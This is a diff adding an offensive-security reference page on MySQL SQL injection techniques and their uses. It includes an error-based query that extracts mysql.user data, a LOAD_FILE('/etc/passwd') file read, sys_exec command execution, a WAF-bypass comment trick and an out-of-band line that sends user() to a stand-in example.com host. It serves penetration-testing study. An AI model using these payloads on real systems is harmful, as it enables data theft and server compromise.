@@ -1,0 +1,193 @@
+---
+title: MySQL SQL Injection Techniques and Exploitation
+description: Comprehensive guide on exploiting MySQL SQL injection techniques to manipulate
+  queries and gain control.
+keywords:
+- MySQL
+- SQL Injection
+- Union Based
+- Error Based
+- Blind SQL
+- Time Based SQL
+- MySQL Exploitation
+- MySQL Keywords
+---
+
+# MySQL
+
+## Context
+
+MySQL is a popular relational database management system frequently targeted in SQL injection attacks. Offensive security practitioners leverage specific MySQL techniques to manipulate database queries, access sensitive data, and potentially gain control over the targeted systems. This document assumes knowledge of basic SQL syntax, database schema understanding, HTTP requests, and SQL Injection fundamentals.
+
+## Theory
+
+### MySQL SQL Injection Techniques
+
+MySQL SQL Injection involves exploiting vulnerabilities in database queries to manipulate the intended operations and retrieve unauthorized data. Attackers typically identify injectable parameters and craft payloads to interact with the database.
+
+### MySQL Specific Keywords and Functions
+
+- **Versioned Comments**: `/*!...*/`, `/*!50000 SELECT 1*/`, `/*!32302 10*/`
+- **Comment and Termination Characters**: `,`, `;`, `%00`, `#`, `--`
+- **Variable and Character Set Manipulation**: `SET NAMES gbk`, `SET @var :=`
+- **Information Functions**: `user()`, `current_user()`, `database()`
+- **Null Handling Functions**: `default()`, `isnull()`, `ifnull()`, `coalesce()`
+- **Type Conversion Functions**: `CAST(... AS CHAR)`, `CONVERT(... USING utf8)`
+
+### MySQL Information Schema
+
+- **Database Schemas**: `INFORMATION_SCHEMA.SCHEMATA`
+- **Index Statistics**: `INFORMATION_SCHEMA.STATISTICS`
+
+### MySQL System Tables
+
+- **User and Database Information**: `mysql.user`, `mysql.db`, `mysql.proc`
+- **InnoDB Table Statistics**: `mysql.innodb_table_stats`
+
+### MySQL Administrative Commands
+
+- **Permissions and Settings**: `SHOW GRANTS`, `SHOW VARIABLES`, `SHOW STATUS`
+- **Process and Structure Information**: `SHOW PROCESSLIST`, `SHOW TABLES`, `SHOW COLUMNS`
+
+## Practice
+
+### MySQL Union Based SQL Injection
+
+- Identify injectable parameter using a UNION SELECT query.
+- Example:
+  ```sql
+  SELECT column1, column2 FROM table UNION SELECT null, null;
+  ```
+
+[Learn more about MySQL Union Based SQL Injection](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_union_based)
+
+**Result**: Extract data from additional tables.
+
+### MySQL Error Based SQL Injection
+
+- Trigger an error to reveal database information.
+- Example:
+  ```sql
+  SELECT 1 FROM table WHERE id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT (SELECT CONCAT(user,0x7e,database())) FROM mysql.user LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a);
+  ```
+
+[Explore MySQL Error Based SQL Injection Techniques](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_error_based)
+
+**Result**: Access sensitive database information.
+
+### MySQL Blind SQL Injection
+
+- Infer data using conditional responses.
+- Example:
+  ```sql
+  SELECT IF(1=1,SLEEP(5),null);
+  ```
+
+[Detail on MySQL Blind SQL Injection](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_blind)
+
+**Result**: Extract data through timing or boolean responses.
+
+### MySQL Time Based SQL Injection
+
+- Use time delays to infer true/false conditions.
+- Example:
+  ```sql
+  SELECT IF(1=1,SLEEP(5),null);
+  ```
+
+[Check MySQL Time Based SQL Injection](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_time_based)
+
+**Result**: Extract data by observing time delays.
+
+### MySQL DIOS - Dump in One Shot
+
+- Dump large amounts of data in a single query.
+- Example:
+  ```sql
+  SELECT GROUP_CONCAT(column1,0x3a,column2) FROM table;
+  ```
+
+[Learn more about MySQL DIOS](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_dios_-_dump_in_one_shot)
+
+**Result**: Extract large datasets in one query.
+
+### MySQL Read Content of a File
+
+- Read server files using `LOAD_FILE()`.
+- Example:
+  ```sql
+  SELECT LOAD_FILE('/etc/passwd');
+  ```
+
+[Explore reading files with MySQL](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_read_content_of_a_file)
+
+**Result**: Access and read server file contents.
+
+### MySQL Command Execution
+
+- Execute system commands via MySQL.
+- Example:
+  ```sql
+  SELECT sys_exec('ls');
+  ```
+
+[Details on MySQL Command Execution](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_command_execution)
+
+**Result**: Execute commands on the server.
+
+### MySQL INSERT Injection
+
+- Inject data into tables using INSERT.
+- Example:
+  ```sql
+  INSERT INTO table (column1) VALUES ('value');
+  ```
+
+[Learn more about MySQL INSERT Injection](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_insert)
+
+**Result**: Insert malicious data into the database.
+
+### MySQL Truncation Attack
+
+- Exploit field length limits to bypass constraints.
+- Example:
+  ```sql
+  INSERT INTO users (username) VALUES ('longusername');
+  ```
+
+[Read more on MySQL Truncation](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_truncation)
+
+**Result**: Bypass input validation through truncation.
+
+### MySQL Out of Band Injection
+
+- Use external channels to exfiltrate data.
+- Example:
+  ```sql
+  SELECT LOAD_FILE(CONCAT('\\\\',user(),'.example.com\\'));
+  ```
+
+[Explore MySQL Out of Band Injection](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_out_of_band)
+
+**Result**: Exfiltrate data using out-of-band channels.
+
+### MySQL WAF Bypass Techniques
+
+- Bypass Web Application Firewalls using obfuscation.
+- Example:
+  ```sql
+  SELECT /*!50000 SELECT 1*/;
+  ```
+
+[Learn more about MySQL WAF Bypass Techniques](offensive/software/applications/server_applications/web/sql_injection/mysql/mysql_waf_bypass)
+
+**Result**: Bypass WAF rules using obfuscation techniques.
+
+## Tools
+
+- **sqlmap**
+- **Havij**
+- **SQLNinja**
+- **jSQL Injection**
+
+This guide provides a structured approach to exploiting MySQL vulnerabilities through various SQL injection techniques, tailored for offensive security testing and research.
